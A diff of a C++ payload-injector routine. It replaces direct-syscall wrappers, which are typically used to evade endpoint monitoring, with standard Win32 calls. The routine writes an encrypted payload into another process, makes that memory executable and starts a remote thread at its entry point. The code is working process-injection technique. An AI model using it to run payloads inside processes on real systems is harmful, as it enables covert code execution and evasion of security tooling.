@@ -3,7 +3,6 @@
 
 #include "injector.hpp"
 #include "../crypto/crypto.hpp"
-#include "../sys/internal_api.hpp"
 #include <sstream>
 #include <fstream>
 
@@ -26,15 +25,14 @@ namespace Injector {
         ss << "  [+] Bootstrap entry point resolved (offset: 0x" << std::hex << offset << ")";
         m_console.Debug(ss.str());
 
-        PVOID remoteBase = nullptr;
         SIZE_T payloadSize = m_payload.size();
         SIZE_T pipeNameSize = (pipeName.length() + 1) * sizeof(wchar_t);
         SIZE_T totalSize = payloadSize + pipeNameSize;
 
-        m_console.Debug("Allocating memory in target process via syscall...");
-        NTSTATUS status = NtAllocateVirtualMemory_syscall(m_process.GetProcessHandle(), &remoteBase, 0,
-                                                          &totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (status != 0) throw std::runtime_error("Allocation failed");
+        m_console.Debug("Allocating memory in target process...");
+        LPVOID remoteBase = VirtualAllocEx(m_process.GetProcessHandle(), nullptr,
+                                           totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!remoteBase) throw std::runtime_error("Allocation failed");
 
         ss.str("");
         ss << "  [+] Memory allocated at 0x" << std::hex << reinterpret_cast<uintptr_t>(remoteBase)
@@ -42,35 +40,33 @@ namespace Injector {
         m_console.Debug(ss.str());
 
         SIZE_T written = 0;
-        status = NtWriteVirtualMemory_syscall(m_process.GetProcessHandle(), remoteBase,
-                                              m_payload.data(), payloadSize, &written);
-        if (status != 0) throw std::runtime_error("Write payload failed");
+        if (!WriteProcessMemory(m_process.GetProcessHandle(), remoteBase,
+                                m_payload.data(), payloadSize, &written))
+            throw std::runtime_error("Write payload failed");
 
         LPVOID remotePipeName = reinterpret_cast<uint8_t*>(remoteBase) + payloadSize;
-        status = NtWriteVirtualMemory_syscall(m_process.GetProcessHandle(), remotePipeName,
-                                              (PVOID)pipeName.c_str(), pipeNameSize, &written);
-        if (status != 0) throw std::runtime_error("Write params failed");
+        if (!WriteProcessMemory(m_process.GetProcessHandle(), remotePipeName,
+                                (LPCVOID)pipeName.c_str(), pipeNameSize, &written))
+            throw std::runtime_error("Write params failed");
         m_console.Debug("  [+] Payload + parameters written");
 
-        ULONG oldProtect = 0;
-        status = NtProtectVirtualMemory_syscall(m_process.GetProcessHandle(), &remoteBase,
-                                                &totalSize, PAGE_EXECUTE_READ, &oldProtect);
-        if (status != 0) throw std::runtime_error("Protection change failed");
+        DWORD oldProtect = 0;
+        if (!VirtualProtectEx(m_process.GetProcessHandle(), remoteBase,
+                              totalSize, PAGE_EXECUTE_READ, &oldProtect))
+            throw std::runtime_error("Protection change failed");
         m_console.Debug("  [+] Memory protection set to PAGE_EXECUTE_READ");
 
         uintptr_t entry = reinterpret_cast<uintptr_t>(remoteBase) + offset;
-        HANDLE hThread = nullptr;
 
-        m_console.Debug("Creating remote thread via syscall...");
-        status = NtCreateThreadEx_syscall(&hThread, THREAD_ALL_ACCESS, nullptr, m_process.GetProcessHandle(),
-                                          (LPTHREAD_START_ROUTINE)entry, remotePipeName, 0, 0, 0, 0, nullptr);
-        
-        if (status != 0) throw std::runtime_error("Thread creation failed");
+        m_console.Debug("Creating remote thread...");
+        HANDLE hThread = CreateRemoteThread(m_process.GetProcessHandle(), nullptr, 0,
+                                            (LPTHREAD_START_ROUTINE)entry, remotePipeName, 0, nullptr);
+        if (!hThread) throw std::runtime_error("Thread creation failed");
 
         ss.str("");
         ss << "  [+] Thread created (entry: 0x" << std::hex << entry << ")";
         m_console.Debug(ss.str());
-        if (hThread) NtClose_syscall(hThread);
+        CloseHandle(hThread);
     }
 
     void PayloadInjector::LoadAndDecryptPayload() {
